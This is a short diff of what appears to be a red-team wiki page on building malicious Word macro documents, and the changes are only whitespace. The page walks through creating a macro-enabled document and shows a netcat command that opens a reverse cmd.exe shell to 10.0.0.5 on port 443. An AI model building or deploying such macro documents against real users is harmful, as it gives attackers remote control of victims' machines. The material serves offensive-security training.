@@ -20,9 +20,9 @@ VBAs/macros by themselves do not inherently bypass any detections.
 
 {% tab title="Basic Usage" %}
 
-1 - Create new word document (CTRL+N)
-2 - Hit ALT+F11 to go into Macro editor
-3 - Double click into the "This document" and CTRL+C/V the below:
+1 - Create new word document (CTRL+N)  
+2 - Hit ALT+F11 to go into Macro editor  
+3 - Double click into the "This document" and CTRL+C/V the below:  
 
 ```bash
 #Macro
@@ -37,8 +37,8 @@ End Sub
 C:\tools\nc.exe 10.0.0.5 443 -e C:\Windows\System32\cmd.exe
 ```
 
-4 - ALT+F11 to switch back to the document editing mode
-5 - Save the file as a macro enabled document, for example as dotm, Word 97-2003 Document.  
+4 - ALT+F11 to switch back to the document editing mode  
+5 - Save the file as a macro enabled document, for example as dotm, Word 97-2003 Document.    
 
 
 {% endtab %}
